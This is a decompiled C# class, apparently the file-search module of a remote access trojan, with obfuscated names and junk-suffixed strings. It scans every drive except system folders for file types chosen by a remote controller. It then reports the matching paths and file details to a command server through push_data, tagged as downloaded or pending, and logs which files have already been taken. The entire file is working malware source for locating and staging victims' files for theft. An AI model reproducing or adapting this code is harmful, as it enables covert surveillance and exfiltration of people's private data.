using System;
using System.Collections.Generic;
using System.IO;

namespace camsars;

internal class romwckoDRIVF
{
	public string romwckomainPath;

	public romwckoMCDM iserver;

	public int romwckosIndx = 0;

	public List<string> romwckonotFilders = new List<string>();

	public string romwcko = "EW2DF56I|wicmxGRF3E8";

	public string romwckofilesLogs = romwckoCONF.romwckofilesLogs;

	public bool romwckoreaging = false;

	public List<string> romwckosFiles = new List<string>();

	public int romwckofIndx = 0;

	public List<string> romwckofExts = new List<string>();

	public romwckoDRIVF()
	{
		romwckonotFilders.Add("documents and settings|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("windows|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("program files (x86)|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("$recycle.bin|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("msocache|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("recoveG3F4D|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("programdata|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("clients_data|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("program files|wicmx".Split(new char[1] { '|' })[0]);
		romwckonotFilders.Add("system volume information|wicmx".Split(new char[1] { '|' })[0]);
	}

	public bool romwckocheckFile(string line)
	{
		try
		{
			if (File.Exists(romwckomainPath + romwckofilesLogs))
			{
				string[] array = File.ReadAllLines(romwckomainPath + romwckofilesLogs);
				string[] array2 = array;
				foreach (string text in array2)
				{
					string[] array3 = text.Split(new char[1] { '<' });
					if (array3.Length > 1)
					{
						if (line.ToLower() == array3[0].ToLower())
						{
							return true;
						}
					}
					else if (line.ToLower() == text.ToLower())
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void romwckosendSearch(string path)
	{
		try
		{
			foreach (string item in romwckoaddFiles(path))
			{
				int num = item.LastIndexOf(".!romwcko".Split(new char[1] { '!' })[0]);
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (romwckofExts.Contains(text.ToLower()))
				{
					if (romwckocheckFile(item))
					{
						iserver.romwckopush_data(null, "romwcko-searf=!romwcko".Split(new char[1] { '!' })[0] + item + "<File_Downloaded<!romwcko".Split(new char[1] { '!' })[0] + iserver.romwckofile_info(item, ret: true));
					}
					else
					{
						iserver.romwckopush_data(null, "romwcko-searf=!romwcko".Split(new char[1] { '!' })[0] + item + "<File_Pending<!romwcko".Split(new char[1] { '!' })[0] + iserver.romwckofile_info(item, ret: true));
					}
				}
				if (iserver.romwckoautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string romwckolookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">!romwcko".Split(new char[1] { '!' })[0];
			}
		}
		return text;
	}

	public void romwckolookFiles(string tempStr)
	{
		iserver.romwckoautCnls = false;
		romwckofExts.Clear();
		romwckosFiles.Clear();
		romwckofIndx = 0;
		romwckosIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				romwckofExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			romwckoreaging = true;
			romwckosendSearch(array[1]);
			romwckoreaging = false;
			iserver.romwckopush_data(null, "romwcko-seard=seahing!romwcko".Split(new char[1] { '!' })[0]);
			return;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		romwckoreaging = true;
		DriveInfo[] array4 = drives;
		foreach (DriveInfo driveInfo in array4)
		{
			if (driveInfo.IsReady)
			{
				romwckosendSearch(driveInfo.Name);
			}
		}
		iserver.romwckopush_data(null, "romwcko-seard=searching!romwcko".Split(new char[1] { '!' })[0]);
		romwckoreaging = false;
	}

	public IEnumerable<string> romwckoaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.romwckoautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (romwckoseeAccess(text) && !romwckonotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool romwckoseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string romwckolookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|wicmx".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public bool romwckowriteFile(string line)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(romwckomainPath + romwckofilesLogs, append: true);
			textWriter.WriteLine(line);
			textWriter.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public string romwckocheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (romwckoseeAccess(text2))
				{
					text = text + text2 + ">|wicmx".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}
}
